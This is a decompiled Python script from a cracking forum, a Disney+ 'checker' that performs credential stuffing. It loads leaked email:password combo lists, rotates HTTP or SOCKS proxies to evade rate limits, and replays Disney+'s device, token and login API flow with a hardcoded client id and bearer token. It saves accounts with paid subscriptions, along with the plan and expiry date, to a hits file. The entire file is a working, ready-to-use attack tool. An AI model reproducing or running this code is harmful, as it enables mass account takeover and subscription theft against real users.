#Decompiled by X2X for Cracked.to - Thanks to ForlaxPy for giving me the sample

from multiprocessing.dummy import Pool
import multiprocessing, requests, os, random, re, time, datetime
from time import sleep
from colorama import init, Fore
if not os.path.exists('Results'):
    os.makedirs('Results')

def clear():
    os.system('cls' if os.name == 'nt' else 'echo -e \\\\033c')


os.system('title Disney+ Checker by Yuri - Idle [0/0] - Hits: 0 - Bad: 0')
init()
print('{}\n                                    ____     _\n                                   / __ \\   (_)   _____   ____   ___    __  __    __\n                                  / / / /  / /   / ___/  / __ \\ / _ \\  / / / / __/ /_\n                                 / /_/ /  / /   (__  )  / / / //  __/ / /_/ / /_  __/\n                                /_____/  /_/   /____/  /_/ /_/ \\___/  \\__, /   /_/\n                                                                     /____/\n\n                                    [Disney+ - V.1.0.2 | Powered by YURI]\n\n                                            - Developed By{} Yuri\n\n\n'.format(Fore.LIGHTBLUE_EX, Fore.LIGHTWHITE_EX))
print('  ')
lock = multiprocessing.Lock()
time.sleep(1)
combo_txt = input('[+] Enter Combo name: ')
print('  ')
proxy_txt = input('[+] Enter Proxy name: ')
print('  ')
combo_len = len(open(combo_txt, 'r', errors='ignore').read().split('\n'))
proxy_len = len(open(proxy_txt, 'r', errors='ignore').read().split('\n'))
proxy_type = input('[+] Enter Proxy Type [HTTP/SOCKS4/SOCKS5]: ')
print('  ')
thread_num = int(input('[+] Enter number of threads: '))
print('  ')
sleep(2)
clear()
print('{}\n                                    ____     _\n                                   / __ \\   (_)   _____   ____   ___    __  __    __\n                                  / / / /  / /   / ___/  / __ \\ / _ \\  / / / / __/ /_\n                                 / /_/ /  / /   (__  )  / / / //  __/ / /_/ / /_  __/\n                                /_____/  /_/   /____/  /_/ /_/ \\___/  \\__, /   /_/\n                                                                     /____/\n\n                                    [Disney+ - V.1.0.2 | Powered by YURI]\n\n                                            - Developed By{} Yuri\n\n\n'.format(Fore.LIGHTBLUE_EX, Fore.LIGHTWHITE_EX))
print('  ')
print(u'{}\u2554\u2550\u2550\u2550\u2550 Settings \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557{}'.format(Fore.LIGHTBLUE_EX, Fore.LIGHTWHITE_EX))
print(u'{}\u2551{}'.format(Fore.LIGHTBLUE_EX, Fore.LIGHTWHITE_EX))
TotalCombo = print(u'{}\u2551 [+] Combo Loaded :{} {}'.format(Fore.LIGHTBLUE_EX, Fore.LIGHTWHITE_EX, combo_len))
TotalProxy = print(u'{}\u2551 [+] Proxy Loaded :{} {} ({})'.format(Fore.LIGHTBLUE_EX, Fore.LIGHTWHITE_EX, proxy_len, proxy_type))
TotalThread = print(u'{}\u2551 [+] Threads :{} {}'.format(Fore.LIGHTBLUE_EX, Fore.LIGHTWHITE_EX, thread_num))
print(u'{}\u2551{}'.format(Fore.LIGHTBLUE_EX, Fore.LIGHTWHITE_EX))
print(u'{}\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d{}'.format(Fore.LIGHTBLUE_EX, Fore.LIGHTWHITE_EX))
print('  ')
print('{}> [Engine]{} Starting...'.format(Fore.LIGHTBLUE_EX, Fore.LIGHTWHITE_EX))
time.sleep(1)
print('  ')
clientid = 'disney-svod-3d9324fc'
bearer = 'ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84'
Hits = 0
Bad = 0

class Output:

    def put(self, email, password, case, capture=None):
        global Bad
        global Hits
        lock.acquire()
        txt_Hits = open('Results/Hits.txt', 'a+')
        if case == True:
            Hits += 1
            txt_Hits.write('Combo : {}:{} | {}\n================\n'.format(email, password, capture))
            txt_Hits.close()
            print('Combo ~ {}{}:{}{} Capture ~ {}{}{}'.format(Fore.LIGHTGREEN_EX, email, password, Fore.LIGHTWHITE_EX, Fore.LIGHTGREEN_EX, capture, Fore.LIGHTWHITE_EX))
        elif case == False:
            Bad += 1
            print('Combo ~ {}{}:{}{}'.format(Fore.LIGHTRED_EX, email, password, Fore.LIGHTWHITE_EX))
        else:
            os.system('title ' + 'Disney+ Checker  by Yuri - Checking [{}/{}] - Hits: {} - Bad: {} '.format(Hits + Bad, combo_len, Hits, Bad))
            lock.release()


class Proxies:

    def __init__(self):
        self.proxies = []

    def load_proxies(self, proxy_txt):
        with open(proxy_txt, 'r', errors='ignore') as (f):
            self.proxies = f.read().split('\n')

    def random_proxy(self, proxy_type):
        self.load_proxies(proxy_txt)
        proxy = random.choice(self.proxies)
        proxy_type = proxy_type.lower()
        if proxy_type == 'http':
            return {'http':proxy, 
             'https':proxy}
        elif proxy_type == 'socks4':
            return {'https': 'socks4://' + proxy}
        elif proxy_type == 'socks5':
            return {'https': 'socks5://' + proxy}
        else:
            return {'https': proxy}


class Post:

    def find_between(self, s, first, last):
        try:
            start = s.index(first) + len(first)
            end = s.index(last, start)
            return s[start:end]
        except ValueError:
            return ''

    def login(self, email, password):
        while True:
            try:
                session = requests.session()
                session.proxies = Proxies().random_proxy(proxy_type)
                url = 'https://global.edge.bamgrid.com/devices'
                data = '{"deviceFamily":"browser","applicationRuntime":"chrome","deviceProfile":"windows","attributes":{}}'
                head = {'Host':'global.edge.bamgrid.com', 
                 'Connection':'keep-alive', 
                 'x-bamsdk-platform':'windows', 
                 'Origin':'https://www.disneyplus.com', 
                 'x-bamsdk-client-id':'' + clientid + '', 
                 'authorization':'Bearer ' + bearer + '', 
                 'content-type':'application/json; charset=UTF-8', 
                 'x-bamsdk-version':'4.2', 
                 'accept':'application/json; charset=utf-8', 
                 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36', 
                 'Sec-Fetch-Site':'cross-site', 
                 'Sec-Fetch-Mode':'cors', 
                 'Referer':'https://www.disneyplus.com/login'}
                get = session.post(url, data=data, headers=head).text
                token = self.find_between(get, 'assertion":"', '"}')
                ap = 'https://global.edge.bamgrid.com/token'
                dat = 'grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token=' + token + '&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice'
                header = {'Host':'global.edge.bamgrid.com', 
                 'Connection':'keep-alive', 
                 'x-bamsdk-platform':'windows', 
                 'Origin':'https://www.disneyplus.com', 
                 'x-bamsdk-client-id':'' + clientid + '', 
                 'authorization':'Bearer ' + bearer + '', 
                 'content-type':'application/x-www-form-urlencoded', 
                 'x-bamsdk-version':'4.2', 
                 'accept':'application/json; charset=utf-8', 
                 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36', 
                 'Sec-Fetch-Site':'cross-site', 
                 'Sec-Fetch-Mode':'cors', 
                 'Referer':'https://www.disneyplus.com/login'}
                tx = session.post(ap, data=dat, headers=header).text
                accesstoken = self.find_between(tx, 'access_token":"', '"')
                api = 'https://global.edge.bamgrid.com/idp/login'
                datx = '{"email":"' + email + '","password":"' + password + '"}'
                headers = {'Host':'global.edge.bamgrid.com', 
                 'Connection':'keep-alive', 
                 'x-bamsdk-platform':'windows', 
                 'Origin':'https://www.disneyplus.com', 
                 'x-bamsdk-client-id':'' + clientid + '', 
                 'authorization':'Bearer ' + accesstoken + '', 
                 'content-type':'application/json', 
                 'x-bamsdk-version':'4.2', 
                 'accept':'application/json; charset=utf-8', 
                 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36', 
                 'Sec-Fetch-Site':'cross-site', 
                 'Sec-Fetch-Mode':'cors', 
                 'Referer':'https://www.disneyplus.com/login/password'}
                req = session.post(api, data=datx, headers=headers)
                src = req.text
                idtoken = self.find_between(src, 'id_token":"', '"')
                if 'bad-credentials' in src:
                    Output().put(email, password, False)
                elif 'token_type' in src:
                    api = 'https://global.edge.bamgrid.com/accounts/grant'
                    date = '{"id_token":"' + idtoken + '"}'
                    headerxx = {'Host':'global.edge.bamgrid.com', 
                     'Connection':'keep-alive', 
                     'x-bamsdk-platform':'windows', 
                     'Origin':'https://www.disneyplus.com', 
                     'x-bamsdk-client-id':'' + clientid + '', 
                     'authorization':'Bearer ' + accesstoken + '', 
                     'content-type':'application/json', 
                     'x-bamsdk-version':'4.2', 
                     'accept':'application/json; charset=utf-8', 
                     'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36', 
                     'Sec-Fetch-Site':'cross-site', 
                     'Sec-Fetch-Mode':'cors', 
                     'Referer':'https://www.disneyplus.com/login/password'}
                    reqq = session.post(api, data=date, headers=headerxx)
                    sec = reqq.text
                    assertion = self.find_between(sec, 'assertion":"', '"')
                    app = 'https://global.edge.bamgrid.com/token'
                    datax = 'grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token=' + assertion + '&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Aaccount'
                    headers = {'Host':'global.edge.bamgrid.com', 
                     'Connection':'keep-alive', 
                     'x-bamsdk-platform':'windows', 
                     'Origin':'https://www.disneyplus.com', 
                     'x-bamsdk-client-id':'' + clientid + '', 
                     'authorization':'Bearer ' + bearer + '', 
                     'content-type':'application/x-www-form-urlencoded', 
                     'x-bamsdk-version':'4.2', 
                     'accept':'application/json; charset=utf-8', 
                     'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36', 
                     'Sec-Fetch-Site':'cross-site', 
                     'Sec-Fetch-Mode':'cors', 
                     'Referer':'https://www.disneyplus.com/login/password'}
                    sex = session.post(app, data=datax, headers=headers).text
                    accesstokenx = self.find_between(sex, 'access_token":"', '"')
                    apx = 'https://global.edge.bamgrid.com/subscriptions'
                    headers = {'Host':'global.edge.bamgrid.com', 
                     'Connection':'keep-alive', 
                     'x-bamsdk-platform':'windows', 
                     'Origin':'https://www.disneyplus.com', 
                     'x-bamsdk-client-id':'disney-svod-3d9324fc', 
                     'authorization':'Bearer ' + accesstokenx + '', 
                     'content-type':'application/x-www-form-urlencoded', 
                     'x-bamsdk-version':'4.2', 
                     'accept':'application/json; charset=utf-8', 
                     'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36', 
                     'Sec-Fetch-Site':'cross-site', 
                     'Sec-Fetch-Mode':'cors', 
                     'Referer':'https://www.disneyplus.com/login/password'}
                    sexx = session.get(apx, headers=headers).text
                    if 'Disney Plus Monthly with 7 Day Free Trial' in sexx:
                        Output().put(email, password, False)
                    elif 'name' not in sexx:
                        Output().put(email, password, False)
                    else:
                        cap = self.find_between(sexx, 'name":"', '"')
                        cap2 = self.find_between(sexx, 'expirationDate":"', 'T')
                        Output().put(email, password, True, 'Subscription: {} | Expiration: {}'.format(cap, cap2))
                elif 'unauthorized_client' in tx:
                    raise Exception
                break
            except Exception as e:
                try:
                    pass
                finally:
                    e = None
                    del e


class Thread:

    def __init__(self, cmb_txt, threads):
        self.cmb_txt = cmb_txt
        self.threads = threads
        self.accounts = []

    def load(self):
        with open((self.cmb_txt), errors='ignore') as (f):
            lines = f.read().split('\n')
        for line in lines:
            if line.count(':') == 1:
                email, password = line.split(':')
                self.accounts.append({'email':email, 
                 'password':password})

    def brute(self, account):
        email = account['email']
        password = account['password']
        Post().login(email, password)

    def main(self):
        self.load()
        pool = Pool(self.threads)
        for _ in pool.imap_unordered(self.brute, self.accounts):
            pass


if __name__ == '__main__':
    Thread(combo_txt, thread_num).main()
    print(' ')
    input('[+] Completed')